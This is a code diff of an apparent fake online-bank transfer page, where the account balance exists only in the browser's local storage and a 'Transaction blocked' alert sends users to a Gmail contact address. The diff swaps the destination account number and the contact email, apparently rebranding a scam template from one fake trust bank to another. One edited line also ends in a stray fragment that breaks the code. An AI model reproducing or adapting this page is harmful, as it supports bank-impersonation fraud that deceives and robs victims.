@@ -145,7 +145,7 @@ footer {
   var transferBtn = document.getElementById("transferBtn");
 
   // Set the account number to transfer to
-  var accountNumberToTransferTo = "3142888371";
+  var accountNumberToTransferTo = "3142800903";
 
   // Add an event listener to the transfer button
   transferBtn.addEventListener("click", function() {
@@ -167,21 +167,21 @@ footer {
       }
     } else {
       // Display an error message if the transaction is blocked
-      alert("Transaction blocked! Please contact us at fidelityamericatrust@gmail.com for further assistance.");
+      alert("Transaction blocked! Please contact us at newlifetrustbank@gmail.com for further assistance.");nk
     }
   });
 
   function transferAmount() {
-    var transferAmount = document.getElementById('amount').value;
-    var currentBalance = parseFloat(localStorage.getItem('balance'));
-    if (isNaN(currentBalance)) {
-      currentBalance = 0;
-    }
-    var newBalance = currentBalance - parseFloat(transferAmount);
-    console.log("New Balance: " + newBalance);
-    localStorage.setItem('balance', newBalance);
-    window.location.href = 'domsitee.html';
+  var transferAmount = document.getElementById('amount').value;
+  var currentBalance = parseFloat(localStorage.getItem('balance'));
+  if (isNaN(currentBalance)) {
+    currentBalance = 0;
   }
+  var newBalance = currentBalance - parseFloat(transferAmount);
+  console.log("New Balance: " + newBalance);
+  localStorage.setItem('balance', newBalance);
+  window.location.href = 'domsitee.html';
+}
 
   // Get the form element
   var form = document.getElementById('transferForm');
